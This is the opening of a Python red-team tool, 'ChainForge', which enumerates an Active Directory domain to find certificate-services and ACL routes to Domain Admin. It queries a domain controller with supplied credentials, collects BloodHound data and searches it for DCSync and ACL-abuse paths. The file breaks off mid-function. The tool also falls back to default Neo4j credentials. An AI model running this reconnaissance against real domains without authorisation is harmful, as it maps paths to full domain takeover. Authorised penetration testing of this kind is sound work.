#!/usr/bin/env python3
"""
ChainForge v1.0 — ADCS Attack Triage & Chain Resolution
Enumerate → Triage → Forge attack chains based on discovered privilege level.
CA name is auto-detected. bloodyAD is auto-installed if missing. Output saved to file.

Usage:
  python3 chainforge.py -u <user> -p '<password>' -d <domain> --dc-ip <dc_ip>
  python3 chainforge.py -u <user> -p '<password>' -d <domain> --dc-ip <dc_ip> --output results.txt

  # Full pipeline: collect → import → graph analysis → ADCS triage (one command):
  python3 chainforge.py -u <user> -p '<password>' -d <domain> --dc-ip <dc_ip> --bloodhound --neo4j

  # Graph analysis only (data already in Neo4j):
  python3 chainforge.py -u <user> -p '<password>' -d <domain> --dc-ip <dc_ip> --neo4j

  # Custom Neo4j endpoint (non-default URL or credentials):
  python3 chainforge.py -u <user> -p '<password>' -d <domain> --dc-ip <dc_ip> \\
    --neo4j-url bolt://10.0.0.5:7687 --neo4j-pass <custom_password>
"""

import argparse
import subprocess
import re
import os
import sys
import time
from datetime import datetime

R    = "\033[91m"
G    = "\033[92m"
Y    = "\033[93m"
B    = "\033[94m"
C    = "\033[96m"
DIM  = "\033[2m"
BOLD = "\033[1m"
RST  = "\033[0m"

BANNER = f"""
{R}╔══════════════════════════════════════════════════════════╗
║         ChainForge v1.0 — ADCS Attack Chain Forge        ║
║            Enumerate → Triage → Chain → DA               ║
╚══════════════════════════════════════════════════════════╝{RST}
"""

# Global output file handle — set in main() if --output is specified
_outfile = None
_phase_start = None

PRIV_GROUPS = [
    "Domain Admins", "Enterprise Admins", "Administrators",
    "Schema Admins", "Account Operators", "Backup Operators",
    "Server Operators", "Cert Publishers", "Group Policy Creator Owners"
]

LOW_PRIV_ENROLL = ["Domain Users", "Authenticated Users", "Everyone"]
LOW_PRIV_COMPUTER = ["Domain Computers"]

DANGEROUS_ACL_FIELDS = [
    "Write Owner Principals",
    "Write Dacl Principals",
    "Full Control Principals",
]


# ─────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────

def _print(msg):
    """Print to stdout and optionally tee to output file (ANSI stripped)."""
    print(msg)
    if _outfile:
        ansi_escape = re.compile(r'\033\[[0-9;]*m')
        _outfile.write(ansi_escape.sub('', msg) + '\n')
        _outfile.flush()

def run(cmd, label=None, timeout=45):
    if label:
        _print(f"  {DIM}[>] {label}{RST}")
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout + r.stderr
    except subprocess.TimeoutExpired:
        return "[!] timed out"
    except Exception as e:
        return f"[!] error: {e}"

def ok(msg, detail=""):
    _print(f"\n  {G}[+]{RST} {BOLD}{msg}{RST}")
    if detail:
        for line in detail.strip().split('\n'):
            _print(f"       {DIM}{line}{RST}")

def section(title):
    _print(f"\n{B}{BOLD}{'─'*62}{RST}")
    _print(f"{B}{BOLD}  {title}{RST}")
    _print(f"{B}{BOLD}{'─'*62}{RST}")

def crit(msg, detail="", cmds=None):
    _print(f"\n  {R}{BOLD}[CRIT]{RST} {BOLD}{msg}{RST}")
    _body(detail, cmds)

def high(msg, detail="", cmds=None):
    _print(f"\n  {R}[HIGH]{RST} {BOLD}{msg}{RST}")
    _body(detail, cmds)

def med(msg, detail="", cmds=None):
    _print(f"\n  {Y}[MED] {RST} {BOLD}{msg}{RST}")
    _body(detail, cmds)

def info(msg, detail="", cmds=None):
    _print(f"\n  {C}[INFO]{RST} {msg}")
    _body(detail, cmds)

def skip(msg):
    _print(f"  {DIM}[----] {msg}{RST}")

def _body(detail, cmds):
    if detail:
        for line in detail.strip().split('\n'):
            _print(f"         {DIM}{line}{RST}")
    if cmds:
        _print(f"         {Y}Commands:{RST}")
        for c in cmds:
            if not c.strip():
                _print("")
            elif c.startswith("#"):
                _print(f"           {DIM}{c}{RST}")
            else:
                _print(f"           {DIM}$ {c}{RST}")


def _certipy_field(block, field_name):
    """
    Extract a Certipy field value from a template/CA block, tolerant of
    varying whitespace. Returns the stripped value string, or None.
    Handles both 'Field : Value' and 'Field: Value' formats across
    Certipy v4 and v5.
    """
    m = re.search(rf'{re.escape(field_name)}\s*:\s*(.+)', block)
    return m.group(1).strip() if m else None


def _certipy_field_bool(block, field_name):
    """
    Return True/False/None for a Certipy boolean field.
    Tolerant of whitespace differences between Certipy versions.
    """
    val = _certipy_field(block, field_name)
    if val is None:
        return None
    return val.lower() == 'true'


def _certipy_field_int(block, field_name, default=0):
    """
    Return integer value for a Certipy numeric field, with a default.
    """
    val = _certipy_field(block, field_name)
    if val is None:
        return default
    try:
        return int(val)
    except ValueError:
        return default


def _split_certipy_blocks(output):
    """
    Split Certipy stdout into individual template/CA blocks.
    Works across Certipy v4 ('\\n  N\\n' delimiters) and v5
    (which may use different numbering/formatting).
    Returns a list of block strings.
    """
    # Certipy v4/v5: blocks separated by a line with just a number
    blocks = re.split(r'\n\s+\d+\s*\n', output)
    # Filter empty blocks
    return [b for b in blocks if b.strip()]


def _shlex_quote(s):
    """Shell-quote a string safely (handles special chars in passwords)."""
    import shlex
    return shlex.quote(s)


# ─────────────────────────────────────────────────────────────
# PRE-FLIGHT — bloodyAD detection / auto-install
# ─────────────────────────────────────────────────────────────

BLOODYADPY = None  # set by preflight()

def preflight():
    """
    Pre-flight checks — verify all required tools are present.
    If anything is missing, shows the list and asks permission once to install all.
    """
    global BLOODYADPY

    found = []
    to_install = []   # list of (name, install_cmd, install_type) tuples

    # ─── Define all tools and their install methods ───
    # Format: (check_method, check_arg, install_cmd, install_type)
    #   check_method: "which", "python", "file"
    #   install_type: "pip", "apt", "git", "pip_neo4j"

    # CLI tools (checked via `which`)
    cli_tools = {
        "certipy-ad":           ("pip3 install certipy-ad --break-system-packages", "pip"),
        "netexec":              ("pip3 install netexec --break-system-packages", "pip"),
        "ldapsearch":           ("sudo apt-get install -y ldap-utils", "apt"),
        "impacket-addcomputer": ("pip3 install impacket --break-system-packages", "pip"),
        "impacket-secretsdump": ("pip3 install impacket --break-system-packages", "pip"),
        "bloodhound-python":    ("pip3 install bloodhound --break-system-packages", "pip"),
        "bloodhound-import":    ("pip3 install bloodhound-import --break-system-packages", "pip"),
        "git":                  (None, None),
    }

    for tool, (install_cmd, install_type) in cli_tools.items():
        result = subprocess.run(
            f"which {tool.split()[0]} 2>/dev/null",
            shell=True, capture_output=True, text=True
        )
        if result.stdout.strip():
            found.append(tool)
        elif install_cmd:
            to_install.append((tool, install_cmd, install_type))
        else:
            # git — critical, can't auto-install
            _print(f"  {R}[CRIT]{RST} {tool} — required, not found. Install manually.")

    # neo4j Python driver
    try:
        import neo4j as _neo4j_test
        found.append(f"neo4j-driver(v{_neo4j_test.__version__})")
    except ImportError:
        to_install.append(("neo4j-driver", "pip3 install neo4j --break-system-packages", "pip"))

    # bloodhound-quickwin
    bhqc_found = False
    for candidate in ["/opt/BA_tools/bhqc.py", "/opt/bloodhound-quickwin/bhqc.py"]:
        if os.path.isfile(candidate):
            found.append("bloodhound-quickwin")
            bhqc_found = True
            break
    if not bhqc_found:
        which_bhqc = subprocess.run("which bhqc.py 2>/dev/null",
                                     shell=True, capture_output=True, text=True)
        if which_bhqc.stdout.strip():
            found.append("bloodhound-quickwin")
            bhqc_found = True
    if not bhqc_found:
        to_install.append(("bloodhound-quickwin",
                           "git clone https://github.com/kaluche/bloodhound-quickwin /opt/bloodhound-quickwin",
                           "git"))

    # bloodyAD
    for path in ["/opt/bloodyAD/bloodyAD.py", "/opt/bloodyad/bloodyAD.py"]:
        if os.path.isfile(path):
            BLOODYADPY = path
            found.append("bloodyAD")
            break
    if not BLOODYADPY:
        which = subprocess.run("which bloodyAD 2>/dev/null", shell=True,
                               capture_output=True, text=True)
        if which.stdout.strip():
            BLOODYADPY = which.stdout.strip()
            found.append("bloodyAD")
    if not BLOODYADPY:
        to_install.append(("bloodyAD",
                           "git clone https://github.com/CravateRouge/bloodyAD /opt/bloodyAD",
                           "git"))

    # ─── Report found tools ───
    if found:
        ok(f"{len(found)} tools ready: {', '.join(found)}")

    # ─── If nothing missing, we're done ───
    if not to_install:
        ok("All tools present")
        return True

    # ─── Show missing and ask once ───
    # Deduplicate pip packages (e.g. impacket-addcomputer + impacket-secretsdump both need impacket)
    _print(f"\n  {Y}[!]{RST} {len(to_install)} tool(s) missing:")
    for name, cmd, itype in to_install:
        _print(f"       {Y}•{RST} {name}  {DIM}({cmd}){RST}")

    needs_sudo = any(t[2] == "apt" for t in to_install)
    if needs_sudo:
        _print(f"       {DIM}(some packages require sudo){RST}")

    try:
        answer = input(f"\n  {Y}[?]{RST} Install all missing tools now? [Y/n] ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        answer = "n"

    if answer and answer != "y":
        _print(f"\n  {DIM}Skipping auto-install. Some phases may fail.{RST}")
        for name, cmd, itype in to_install:
            _print(f"       {DIM}Manual: {cmd}{RST}")
        return False

    # ─── Install everything ───
    _print("")
    installed = []
    failed = []

    # Deduplicate pip commands (impacket appears twice)
    seen_cmds = set()
    for name, cmd, itype in to_install:
        if cmd in seen_cmds:
            continue
        seen_cmds.add(cmd)

        _print(f"  {DIM}[>] Installing {name}...{RST}")

        if itype == "pip":
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=120
            )
            if result.returncode == 0:
                installed.append(name)
            else:
                failed.append((name, result.stderr[:200]))

        elif itype == "apt":
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=120
            )
            if result.returncode == 0:
                installed.append(name)
            else:
                failed.append((name, result.stderr[:200]))

        elif itype == "git":
            result = subprocess.run(
                cmd + " 2>&1", shell=True, capture_output=True, text=True, timeout=60
            )
            if result.returncode == 0:
                installed.append(name)

                # Post-clone: install requirements if present
                if "bloodyAD" in cmd:
                    req = "/opt/bloodyAD/requirements.txt"
                    if os.path.isfile(req):
                        subprocess.run(
                            f"pip3 install -r {req} --break-system-packages -q 2>/dev/null",
                            shell=True, timeout=60
                        )
                    BLOODYADPY = "/opt/bloodyAD/bloodyAD.py"

                elif "bloodhound-quickwin" in cmd:
                    req = "/opt/bloodhound-quickwin/requirements.txt"
                    if os.path.isfile(req):
                        subprocess.run(
                            f"pip3 install -r {req} --break-system-packages -q 2>/dev/null",
                            shell=True, timeout=60
                        )
            else:
                failed.append((name, result.stdout[:200]))

    # ─── Report results ───
    if installed:
        ok(f"Installed {len(installed)} tool(s): {', '.join(installed)}")

    if failed:
        for name, err in failed:
            _print(f"  {R}[!]{RST} Failed to install {name}")
            if err.strip():
                _print(f"       {DIM}{err.strip()[:150]}{RST}")

    return len(failed) == 0


def bloodyad_cmd(user, password, domain, dc_ip, args_str):
    """Build a bloodyAD command using the detected path."""
    if not BLOODYADPY:
        return "echo '[!] bloodyAD not available'"
    pw_quoted = _shlex_quote(password)
    return (f"python3 {BLOODYADPY} -u {user} -p {pw_quoted} "
            f"-d {domain} --host {dc_ip} {args_str}")


# ─────────────────────────────────────────────────────────────
# CERTIPY OUTPUT CACHE
# Certipy is called multiple times — cache full and vuln outputs
# so we only run each scan once per execution.
# ─────────────────────────────────────────────────────────────

_certipy_cache = {}

def certipy_find(user, password, domain, dc_ip, vulnerable=False):
    """Run certipy-ad find and cache the result."""
    key = f"{'vuln' if vulnerable else 'full'}"
    if key not in _certipy_cache:
        flag = "-vulnerable" if vulnerable else ""
        pw_quoted = _shlex_quote(password)
        _certipy_cache[key] = run(
            f"certipy-ad find -u {user}@{domain} -p {pw_quoted} "
            f"-dc-ip {dc_ip} {flag} -stdout 2>/dev/null"
        )
    return _certipy_cache[key]



def detect_ca(user, password, domain, dc_ip):
    """
    Runs a minimal Certipy scan to extract CA name(s) and DNS hostname.
    Returns a list of dicts: [{"name": ..., "dns": ...}, ...]
    Falls back gracefully if detection fails.
    """
    out = certipy_find(user, password, domain, dc_ip, vulnerable=False)

    cas = []
    # Parse CA blocks — each CA has a CA Name and DNS Name
    ca_blocks = _split_certipy_blocks(out)
    for block in ca_blocks:
        name_m = re.search(r'CA Name\s*:\s*(.+)', block)
        dns_m  = re.search(r'DNS Name\s*:\s*(.+)', block)
        if name_m:
            cas.append({
                "name": name_m.group(1).strip(),
                "dns":  dns_m.group(1).strip() if dns_m else dc_ip,
            })

    if cas:
        for ca in cas:
            ok(f"CA detected: {ca['name']}  ({ca['dns']})")
        if len(cas) > 1:
            info(f"{len(cas)} CAs found — using first CA for commands. "
                 "Re-run targeting other CAs manually if needed.")
    else:
        # Fallback: try netexec adcs module
        pw_quoted = _shlex_quote(password)
        nxc_out = run(
            f"netexec ldap {dc_ip} -u {user} -p {pw_quoted} -M adcs 2>/dev/null"
        )
        cn_m = re.search(r'Found CN:\s*(.+)', nxc_out)
        dns_m = re.search(r'Found PKI Enrollment Server:\s*(.+)', nxc_out)
        if cn_m:
            cas.append({
                "name": cn_m.group(1).strip(),
                "dns":  dns_m.group(1).strip() if dns_m else dc_ip,
            })
            ok(f"CA detected (fallback): {cas[0]['name']}  ({cas[0]['dns']})")
        else:
            ca_name = input(
                f"\n  {Y}[!]{RST} Could not auto-detect CA name. "
                f"Enter CA name manually: "
            ).strip()
            cas.append({"name": ca_name, "dns": dc_ip})

    return cas


# ─────────────────────────────────────────────────────────────
# BLOODHOUND COLLECTION
# Optional data collection for offline graph analysis.
# Runs bloodhound-python to collect ACL, group, session data
# that complements the inline checks in Phases 2/4/6.
# ─────────────────────────────────────────────────────────────

def collect_bloodhound(user, password, domain, dc_ip,
                       neo4j_url=None, neo4j_user=None, neo4j_pass=None):
    """
    Full BloodHound data pipeline:
      1. Collect with bloodhound-python → bh_data/
      2. Unzip the .zip into bh_data/
      3. Import into Neo4j via bloodhound-import (if neo4j params provided)
    Returns the bh_data directory path, or None on failure.
    """
    section("BLOODHOUND COLLECTION & IMPORT")

    # Check if bloodhound-python is available
    which = subprocess.run("which bloodhound-python 2>/dev/null",
                           shell=True, capture_output=True, text=True)
    if not which.stdout.strip():
        skip("bloodhound-python not installed — skipping collection")
        info("Install with: pip3 install bloodhound --break-system-packages")
        return None

    bh_dir = "bh_data"

    # ── Clean up old data to prevent accumulation ──
    import shutil
    import glob
    if os.path.isdir(bh_dir):
        shutil.rmtree(bh_dir)
    for old_zip in glob.glob("*_bloodhound.zip"):
        os.remove(old_zip)

    os.makedirs(bh_dir, exist_ok=True)

    pw_quoted = _shlex_quote(password)

    # ── Step 1: Collect ──
    bh_out = run(
        f"bloodhound-python -u {user} -p {pw_quoted} "
        f"-d {domain} -ns {dc_ip} -c all --zip 2>&1",
        "Collecting BloodHound data (all collection methods)",
        timeout=120
    )

    # Find the generated zip (bloodhound-python drops it in CWD)
    zip_files = sorted(glob.glob("*_bloodhound.zip"), key=os.path.getmtime, reverse=True)
    if not zip_files:
        med("BloodHound collection may have failed — no zip file found",
            f"Output: {bh_out[:500]}")
        return None

    zip_path = zip_files[0]
    ok(f"BloodHound data collected: {zip_path}")

    # ── Step 2: Unzip into bh_data/ ──
    import zipfile
    try:
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(bh_dir)
        json_files = [f for f in os.listdir(bh_dir) if f.endswith('.json')]
        ok(f"Extracted {len(json_files)} JSON files → {bh_dir}/",
           '\n'.join(json_files))
    except Exception as e:
        med(f"Failed to unzip {zip_path}: {e}")
        return bh_dir

    # ── Step 3: Import into Neo4j (if params provided) ──
    if neo4j_url and json_files:
        bhi_check = subprocess.run("which bloodhound-import 2>/dev/null",
                                    shell=True, capture_output=True, text=True)
        if not bhi_check.stdout.strip():
            med("bloodhound-import not available — skipping Neo4j import",
                "Data collected and unzipped. Import manually:\n"
                f"  bloodhound-import -du {neo4j_user or 'neo4j'} "
                f"-dp <password> --database 127.0.0.1 -p 7687 -s bolt {bh_dir}/*.json")
            return bh_dir

        # Parse host and port from neo4j_url (bolt://host:port)
        import urllib.parse
        parsed = urllib.parse.urlparse(neo4j_url)
        neo4j_host = parsed.hostname or "127.0.0.1"
        neo4j_port = str(parsed.port or 7687)
        neo4j_scheme = parsed.scheme or "bolt"

        neo4j_u = neo4j_user or "neo4j"
        neo4j_p = neo4j_pass or "neo4j"

        json_glob = os.path.join(bh_dir, "*.json")
        import_cmd = (
            f"bloodhound-import -du {neo4j_u} -dp {_shlex_quote(neo4j_p)} "
            f"--database {neo4j_host} -p {neo4j_port} -s {neo4j_scheme} "
            f"{json_glob} 2>&1"
        )
        import_out = run(import_cmd, "Importing into Neo4j via bloodhound-import", timeout=120)

        if "ERROR" in import_out and "Parsing function" not in import_out:
            med("Neo4j import may have encountered errors",
                import_out[:500])
        elif "Completed file" in import_out or "Done" in import_out:
            ok("BloodHound data imported into Neo4j successfully")
        else:
            info("Neo4j import completed (check output for details)",
                 import_out[:300])
    elif not neo4j_url:
        info("No --neo4j-url provided — data collected but not imported",
             f"To import manually:\n"
             f"  bloodhound-import -du neo4j -dp <password> "
             f"--database 127.0.0.1 -p 7687 -s bolt {bh_dir}/*.json")

    return bh_dir


# ─────────────────────────────────────────────────────────────
# NEO4J GRAPH ANALYSIS
# Connects to a running Neo4j instance with imported BloodHound data.
# Runs targeted Cypher queries to find multi-hop ACL paths that
# bloodyAD's single-hop attribute checks miss.
# Feeds discovered targets into Phases 2, 4, and 6.
# ─────────────────────────────────────────────────────────────

# Dangerous ACL edge types for Cypher queries
_CYPHER_ACL_EDGES = (
    "GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|"
    "AllExtendedRights|ForceChangePassword|AddMember|"
    "AddSelf|WriteSPN|AddKeyCredentialLink"
)

# All traversal edges including group membership
_CYPHER_ALL_EDGES = (
    "MemberOf|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|"
    "AllExtendedRights|ForceChangePassword|AddMember|AddSelf|"
    "WriteSPN|AddKeyCredentialLink|HasSession|AdminTo|"
    "AllowedToDelegate|CanRDP|ExecuteDCOM|GetChanges|GetChangesAll"
)


def phase_graph_analysis(user, domain, neo4j_url, neo4j_user, neo4j_pass, ctx):
    """
    Run targeted Cypher queries against a Neo4j BloodHound database.
    Returns a dict of discovered attack paths and writable targets.
    """
    section("GRAPH ANALYSIS — Neo4j BloodHound Queries")

    results = {
        "da_paths":          [],   # shortest paths to DA
        "writable_users":    [],   # users we have ACL abuse on
        "writable_computers":[],   # computers we have ACL abuse on
        "dcsync_paths":      [],   # paths to DCSync rights
        "admin_paths":       [],   # paths to AdminTo on computers
        "quickwin_output":   None, # bloodhound-quickwin raw output
    }

    # ── Import neo4j driver ──
    try:
        from neo4j import GraphDatabase
    except ImportError:
        med("neo4j Python driver not installed",
            "Install with: pip3 install neo4j --break-system-packages\n"
            "Graph analysis skipped — falling back to bloodyAD single-hop checks.")
        return results

    # ── Connect ──
    try:
        driver = GraphDatabase.driver(neo4j_url, auth=(neo4j_user, neo4j_pass))
        driver.verify_connectivity()
        ok(f"Connected to Neo4j at {neo4j_url}")
    except Exception as e:
        crit(f"Neo4j connection failed: {e}",
             f"Verify Neo4j is running and credentials are correct.\n"
             f"URL: {neo4j_url}  User: {neo4j_user}")
        return results

    user_upper = f"{user.upper()}@{domain.upper()}"

    def _run_query(query, label, params=None):
        """Execute a Cypher query and return records, with error handling."""
        if label:
            _print(f"  {DIM}[>] {label}{RST}")
        try:
            records, summary, keys = driver.execute_query(
                query, parameters_=params or {}, routing_="r"
            )
            return records
        except Exception as e:
            _print(f"  {DIM}[!] Query error: {e}{RST}")
            return []

    # ── Query 1: Shortest path to Domain Admins ──
    da_records = _run_query(
        f"""
        MATCH (u {{name: $user}})
        MATCH (g:Group)
        WHERE g.name STARTS WITH 'DOMAIN ADMINS@'
        MATCH p=shortestPath((u)-[r:{_CYPHER_ALL_EDGES}*1..]->(g))
        RETURN p, length(p) as hops
        ORDER BY hops ASC LIMIT 5
        """,
        "Shortest paths to Domain Admins",
        {"user": user_upper}
    )
    if da_records:
        for record in da_records:
            path = record["p"]
            hops = record["hops"]
            nodes_in_path = [n.get("name", "?") for n in path.nodes]
            edges_in_path = [r.type for r in path.relationships]
            path_str = ""
            for i, node_name in enumerate(nodes_in_path):
                path_str += node_name
                if i < len(edges_in_path):
                    path_str += f" --[{edges_in_path[i]}]--> "
            results["da_paths"].append({
                "hops": hops,
                "path": path_str,
                "nodes": nodes_in_path,
                "edges": edges_in_path,
            })
        best = results["da_paths"][0]
        fn = crit if best["hops"] <= 3 else high
        fn(f"Path to DA found — {best['hops']} hop(s)",
           '\n'.join(p["path"] for p in results["da_paths"]))
    else:
        skip("No path to Domain Admins found from this user")

    # ── Query 2: Direct + group-transitive ACL abuse on users ──
    acl_user_records = _run_query(
        f"""
        MATCH (u {{name: $user}})
        MATCH p=(u)-[r1:MemberOf*0..5]->(g)-[r2:{_CYPHER_ACL_EDGES}]->(target)
        WHERE target:User AND target.name <> $user
        RETURN DISTINCT target.name AS target,
               type(r2) AS edge,
               CASE WHEN length(p) > 1 THEN g.name ELSE 'direct' END AS via,
               length(p) AS hops
        ORDER BY hops ASC
        """,
        "ACL abuse paths to User objects (via group membership)",
        {"user": user_upper}
    )
    for record in acl_user_records:
        target_name = record["target"]
        edge = record["edge"]
        via = record["via"]
        hops = record["hops"]
        results["writable_users"].append({
            "target": target_name,
            "edge": edge,
            "via": via,
            "hops": hops,
        })

    # ── Query 3: Direct + group-transitive ACL abuse on computers ──
    acl_comp_records = _run_query(
        f"""
        MATCH (u {{name: $user}})
        MATCH p=(u)-[r1:MemberOf*0..5]->(g)-[r2:{_CYPHER_ACL_EDGES}]->(target)
        WHERE target:Computer
        RETURN DISTINCT target.name AS target,
               type(r2) AS edge,
               CASE WHEN length(p) > 1 THEN g.name ELSE 'direct' END AS via,
               length(p) AS hops
        ORDER BY hops ASC
        """,
        "ACL abuse paths to Computer objects (via group membership)",
        {"user": user_upper}
    )
    for record in acl_comp_records:
        target_name = record["target"]
        edge = record["edge"]
        via = record["via"]
        hops = record["hops"]
        results["writable_computers"].append({
            "target": target_name,
            "edge": edge,
            "via": via,
            "hops": hops,
        })

    # ── Report ACL findings ──
    all_writable = results["writable_users"] + results["writable_computers"]
    if all_writable:
        # Separate direct (1-hop) from transitive (multi-hop)
        direct = [w for w in all_writable if w["hops"] <= 1]
        transitive = [w for w in all_writable if w["hops"] > 1]

        if direct:
            high(f"Direct ACL abuse on {len(direct)} object(s)",
                 '\n'.join(f"{w['target']}  --[{w['edge']}]"
                           for w in direct))
        if transitive:
            med(f"Transitive ACL abuse (via groups) on {len(transitive)} object(s)",
                '\n'.join(f"{w['target']}  --[{w['edge']}]  via {w['via']} ({w['hops']} hops)"
                          for w in transitive))
    else:
        skip("No ACL abuse paths found from this user or their groups")

    # ── Query 4: DCSync paths (GetChanges + GetChangesAll) ──
    dcsync_records = _run_query(
        f"""
        MATCH (u {{name: $user}})
        MATCH (d:Domain)
        MATCH p=shortestPath((u)-[r:{_CYPHER_ALL_EDGES}*1..]->(d))
        WHERE ANY(rel in relationships(p) WHERE type(rel) IN ['GetChanges', 'GetChangesAll'])
        RETURN p, length(p) as hops
        ORDER BY hops ASC LIMIT 3
        """,
        "Paths to DCSync rights",
        {"user": user_upper}
    )
    if dcsync_records:
        for record in dcsync_records:
            path = record["p"]
            nodes_in_path = [n.get("name", "?") for n in path.nodes]
            results["dcsync_paths"].append({
                "hops": record["hops"],
                "nodes": nodes_in_path,
            })
        crit(f"DCSync path found — {results['dcsync_paths'][0]['hops']} hop(s)",
             ' → '.join(results['dcsync_paths'][0]['nodes']))
    else:
        skip("No DCSync paths found from this user")

    # ── Query 5: AdminTo paths on computers ──
    admin_records = _run_query(
        f"""
        MATCH (u {{name: $user}})
        MATCH p=shortestPath((u)-[r:{_CYPHER_ALL_EDGES}*1..]->(c:Computer))
        WHERE ANY(rel in relationships(p) WHERE type(rel) = 'AdminTo')
        RETURN c.name AS computer, length(p) as hops
        ORDER BY hops ASC LIMIT 10
        """,
        "Paths to local admin on computers",
        {"user": user_upper}
    )
    if admin_records:
        for record in admin_records:
            results["admin_paths"].append({
                "computer": record["computer"],
                "hops": record["hops"],
            })
        info(f"Admin paths found to {len(results['admin_paths'])} computer(s)",
             '\n'.join(f"{a['computer']} ({a['hops']} hops)"
                       for a in results["admin_paths"]))
    else:
        skip("No AdminTo paths found from this user")

    # ── Query 6: Low-priv group dangerous edges ──
    # Check if Domain Users / Authenticated Users / Everyone have
    # dangerous edges on ANY object — catches misconfigs that affect all users.
    lowpriv_records = _run_query(
        f"""
        MATCH (g:Group)-[r:{_CYPHER_ACL_EDGES}]->(target)
        WHERE g.objectid ENDS WITH '-513'
           OR g.objectid ENDS WITH '-515'
           OR g.objectid ENDS WITH 'S-1-5-11'
           OR g.objectid ENDS WITH 'S-1-1-0'
        RETURN DISTINCT g.name AS src, type(r) AS edge,
               target.name AS target, labels(target) AS labels
        """,
        "Dangerous edges from low-priv groups (Domain Users, Auth Users, Everyone)"
    )
    if lowpriv_records:
        high(f"Low-priv groups have dangerous ACL edges on {len(lowpriv_records)} object(s)",
             '\n'.join(f"{r['src']} --[{r['edge']}]--> {r['target']}"
                       for r in lowpriv_records[:15]))
        # Merge into writable lists for downstream use
        for r in lowpriv_records:
            entry = {
                "target": r["target"],
                "edge": r["edge"],
                "via": r["src"],
                "hops": 1,
            }
            lbls = r.get("labels", [])
            if "Computer" in lbls:
                results["writable_computers"].append(entry)
            else:
                results["writable_users"].append(entry)
    else:
        skip("No dangerous edges from low-priv groups")

    # ── Optional: bloodhound-quickwin (should already be cloned by preflight) ──
    bhqc_path = None
    for candidate in ["/opt/BA_tools/bhqc.py", "/opt/bloodhound-quickwin/bhqc.py"]:
        if os.path.isfile(candidate):
            bhqc_path = candidate
            break
    if not bhqc_path:
        which = subprocess.run("which bhqc.py 2>/dev/null",
                               shell=True, capture_output=True, text=True)
        if which.stdout.strip():
            bhqc_path = which.stdout.strip()

    if bhqc_path:
        info("Running bloodhound-quickwin for supplementary analysis...")
        bhqc_out = run(
            f"python3 {bhqc_path} "
            f"-b '{neo4j_url}' -u '{neo4j_user}' -p '{neo4j_pass}' "
            f"-d '{domain.upper()}' --heavy 2>&1",
            "bloodhound-quickwin (--heavy)",
            timeout=120
        )
        results["quickwin_output"] = bhqc_out
        # Save to file for reference
        bhqc_file = f"bhqc_{domain}.txt"
        try:
            with open(bhqc_file, 'w') as f:
                ansi_escape = re.compile(r'\033\[[0-9;]*m')
                f.write(ansi_escape.sub('', bhqc_out))
            ok(f"bloodhound-quickwin output saved to {bhqc_file}")
        except Exception:
            pass
    else:
        skip("bloodhound-quickwin not available — skipping supplementary analysis")

    # ── Cleanup ──
    try:
        driver.close()
    except Exception:
        pass

    # Summary
    total_targets = len(set(
        w["target"] for w in results["writable_users"] + results["writable_computers"]
    ))
    if total_targets:
        ok(f"Graph analysis complete — {total_targets} unique writable target(s) discovered",
           "These targets will be cross-referenced in Phase 2 (ESC10) and Phase 6 (Shadow Creds)")
    else:
        info("Graph analysis complete — no new writable targets discovered")

    return results


def _merge_graph_targets(graph_results, ctx):
    """
    Merge writable targets discovered by Neo4j graph analysis into ctx
    so Phase 2 and Phase 6 can leverage multi-hop ACL paths.
    Returns lists of sAMAccountName-style names suitable for downstream use.
    """
    writable_sam_users = []
    writable_sam_computers = []

    for w in graph_results.get("writable_users", []):
        # BH names are USER@DOMAIN.COM — extract just the username part
        target = w["target"]
        if "@" in target:
            target = target.split("@")[0]
        writable_sam_users.append(target.lower())

    for w in graph_results.get("writable_computers", []):
        target = w["target"]
        if "@" in target:
            target = target.split("@")[0]
        # BH computer names end with .DOMAIN.COM — convert to sAMAccountName
        if "." in target:
            target = target.split(".")[0] + "$"
        writable_sam_computers.append(target.upper())

    return list(dict.fromkeys(writable_sam_users)), list(dict.fromkeys(writable_sam_computers))


# ─────────────────────────────────────────────────────────────
# PHASE 0 — USER CONTEXT
# ─────────────────────────────────────────────────────────────

def phase0_user_context(user, password, domain, dc_ip):
    section("PHASE 0 — User Context & Privilege Level")

    ctx = {
        "authenticated": False,
        "is_admin":      False,
        "is_priv":       False,
        "groups":        [],
        "priv_groups":   [],
        "admin_hosts":   [],
    }

    pw_quoted = _shlex_quote(password)

    # Auth
    smb_out = run(
        f"netexec smb {dc_ip} -u {user} -p {pw_quoted} 2>/dev/null",
        "SMB authentication check"
    )
    if "[+]" not in smb_out:
        crit(f"Authentication FAILED for {user}@{domain}")
        return ctx

    ctx["authenticated"] = True
    ctx["is_admin"] = "Pwn3d!" in smb_out

    if ctx["is_admin"]:
        crit(f"{user} — DA / Local Admin confirmed on {dc_ip}",
             "Pwn3d! returned. Full control of DC available.\n"
             "High-privilege attack paths are unlocked (see Phase 5).")
    else:
        ok(f"{user} — Authenticated as standard user")

    # Group membership via ldapsearch — two queries for completeness:
    # 1. Direct memberOf on the user object
    # 2. Reverse lookup — which groups list this user as a member (catches nested/implicit)
    dc_base = ','.join(f'DC={p}' for p in domain.split('.'))

    user_dn_out = run(
        f"ldapsearch -H ldap://{dc_ip} "
        f"-D '{user}@{domain}' -w {pw_quoted} "
        f"-b '{dc_base}' "
        f"'(sAMAccountName={user})' dn 2>/dev/null"
    )
    # Extract user DN for reverse lookup
    user_dn_m = re.search(r'^dn:\s*(.+)$', user_dn_out, re.MULTILINE)
    user_dn = user_dn_m.group(1).strip() if user_dn_m else None

    # Query 1: direct memberOf
    memberof_out = run(
        f"ldapsearch -H ldap://{dc_ip} "
        f"-D '{user}@{domain}' -w {pw_quoted} "
        f"-b '{dc_base}' "
        f"'(sAMAccountName={user})' memberOf 2>/dev/null",
        f"Querying {user}'s group memberships (ldapsearch)"
    )

    seen = set()
    ctx["groups"] = []

    # Parse memberOf lines: "memberOf: CN=Administrators,CN=Builtin,DC=..."
    for match in re.finditer(r'^memberOf:\s*CN=([^,\n]+)', memberof_out, re.MULTILINE):
        g = match.group(1).strip()
        if g and g not in seen:
            seen.add(g)
